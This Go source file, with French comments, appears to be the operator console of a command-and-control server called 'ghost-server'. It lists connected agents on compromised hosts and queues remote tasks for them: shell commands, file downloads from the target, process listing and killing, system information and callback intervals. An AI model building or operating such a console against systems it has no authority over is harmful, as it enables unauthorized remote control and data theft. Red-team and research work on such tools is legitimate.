/*
 * console.go - Interface CLI interactive
 */
package cli

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"ghost-server/internal/listener"
	"ghost-server/internal/session"
	"ghost-server/internal/task"
)

// Console représente l'interface CLI
type Console struct {
	sessions *session.Manager
	tasks    *task.Queue
	listener *listener.Manager
	current  string // ID de l'agent sélectionné
}

// NewConsole crée une nouvelle console
func NewConsole(sessions *session.Manager, tasks *task.Queue, listeners *listener.Manager) *Console {
	return &Console{
		sessions: sessions,
		tasks:    tasks,
		listener: listeners,
	}
}

// Run lance la boucle principale de la console
func (c *Console) Run() {
	reader := bufio.NewReader(os.Stdin)

	for {
		// Affiche le prompt
		prompt := "ghost"
		if c.current != "" {
			if agent, ok := c.sessions.Get(c.current); ok {
				prompt = fmt.Sprintf("ghost (%s)", agent.GetDisplayName())
			}
		}
		fmt.Printf("\n%s > ", prompt)

		// Lit la commande
		input, err := reader.ReadString('\n')
		if err != nil {
			continue
		}

		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}

		// Parse et exécute
		c.execute(input)
	}
}

// execute traite une commande
func (c *Console) execute(input string) {
	parts := strings.Fields(input)
	if len(parts) == 0 {
		return
	}

	cmd := strings.ToLower(parts[0])
	args := parts[1:]

	switch cmd {
	case "help", "?":
		c.cmdHelp()

	case "agents", "list":
		c.cmdAgents()

	case "use", "interact":
		if len(args) < 1 {
			fmt.Println("Usage: use <agent_id>")
			return
		}
		c.cmdUse(args[0])

	case "back":
		c.current = ""
		fmt.Println("[*] Deselected agent")

	case "shell":
		if c.current == "" {
			fmt.Println("[-] No agent selected. Use 'use <agent_id>' first.")
			return
		}
		if len(args) < 1 {
			fmt.Println("Usage: shell <command>")
			return
		}
		c.cmdTask("shell", strings.Join(args, " "))

	case "pwd", "whoami", "sysinfo", "ps":
		if c.current == "" {
			fmt.Println("[-] No agent selected.")
			return
		}
		c.cmdTask(cmd, "")

	case "cd", "ls", "dir":
		if c.current == "" {
			fmt.Println("[-] No agent selected.")
			return
		}
		arg := ""
		if len(args) > 0 {
			arg = args[0]
		}
		c.cmdTask(cmd, arg)

	case "download":
		if c.current == "" {
			fmt.Println("[-] No agent selected.")
			return
		}
		if len(args) < 1 {
			fmt.Println("Usage: download <remote_path>")
			return
		}
		c.cmdTask("download", args[0])

	case "sleep":
		if c.current == "" {
			fmt.Println("[-] No agent selected.")
			return
		}
		if len(args) < 1 {
			fmt.Println("Usage: sleep <seconds>")
			return
		}
		c.cmdTask("sleep", args[0])

	case "exit", "quit":
		fmt.Println("[*] Use Ctrl+C to exit the server")

	case "tasks":
		c.cmdTasks()

	case "kill":
		if c.current == "" {
			fmt.Println("[-] No agent selected.")
			return
		}
		if len(args) < 1 {
			fmt.Println("Usage: kill <pid>")
			return
		}
		c.cmdTask("kill", args[0])

	default:
		fmt.Printf("[-] Unknown command: %s. Type 'help' for available commands.\n", cmd)
	}
}

// cmdHelp affiche l'aide
func (c *Console) cmdHelp() {
	help := `
Available Commands:
  agents/list          - List all connected agents
  use <id>             - Select an agent to interact with
  back                 - Deselect current agent
  tasks                - Show pending tasks for current agent

Agent Commands (requires selected agent):
  shell <cmd>          - Execute a shell command
  pwd                  - Print working directory
  cd <path>            - Change directory
  ls [path]            - List directory contents
  download <path>      - Download a file from target
  ps                   - List processes
  kill <pid>           - Kill a process
  whoami               - Get current user info
  sysinfo              - Get system information
  sleep <seconds>      - Change callback interval

General:
  help                 - Show this help
  exit/quit            - Exit console (use Ctrl+C to stop server)
`
	fmt.Println(help)
}

// cmdAgents liste les agents
func (c *Console) cmdAgents() {
	agents := c.sessions.GetAll()

	if len(agents) == 0 {
		fmt.Println("[*] No agents connected")
		return
	}

	fmt.Println("\nConnected Agents:")
	fmt.Println("================")
	fmt.Printf("%-12s %-25s %-15s %-10s %-8s\n", "ID", "USER@HOST", "OS", "STATUS", "LAST SEEN")
	fmt.Println(strings.Repeat("-", 75))

	for _, agent := range agents {
		proto := agent.ToProtocol()
		since := proto.LastSeen.Format("15:04:05")
		fmt.Printf("%-12s %-25s %-15s %-10s %-8s\n",
			proto.ID[:12],
			proto.Username+"@"+proto.Hostname,
			proto.OS,
			proto.Status,
			since,
		)
	}
}

// cmdUse sélectionne un agent
func (c *Console) cmdUse(id string) {
	// Cherche un agent qui commence par cet ID
	agents := c.sessions.GetAll()
	var match *session.Agent

	for _, agent := range agents {
		if strings.HasPrefix(agent.ID, id) {
			if match != nil {
				fmt.Println("[-] Ambiguous ID, be more specific")
				return
			}
			match = agent
		}
	}

	if match == nil {
		fmt.Printf("[-] Agent not found: %s\n", id)
		return
	}

	c.current = match.ID
	fmt.Printf("[+] Interacting with %s\n", match.GetDisplayName())
}

// cmdTask envoie une tâche à l'agent sélectionné
func (c *Console) cmdTask(command, args string) {
	qt := c.tasks.Add(c.current, command, args)
	fmt.Printf("[*] Task queued: %s (waiting for agent to check in)\n", qt.Task.TaskID[:8])
}

// cmdTasks affiche les tâches de l'agent courant
func (c *Console) cmdTasks() {
	if c.current == "" {
		fmt.Println("[-] No agent selected")
		return
	}

	tasks := c.tasks.GetForAgent(c.current)
	if len(tasks) == 0 {
		fmt.Println("[*] No tasks for this agent")
		return
	}

	fmt.Println("\nTasks:")
	fmt.Println("======")

	for _, qt := range tasks {
		status := "pending"
		if qt.Completed {
			status = "completed"
		} else if qt.Picked {
			status = "in progress"
		}

		fmt.Printf("[%s] %s %s (%s)\n", qt.Task.TaskID[:8], qt.Task.Command, qt.Task.Args, status)

		if qt.Result != nil && qt.Result.Output != "" {
			fmt.Println("Output:")
			fmt.Println(qt.Result.Output)
		}
	}
}
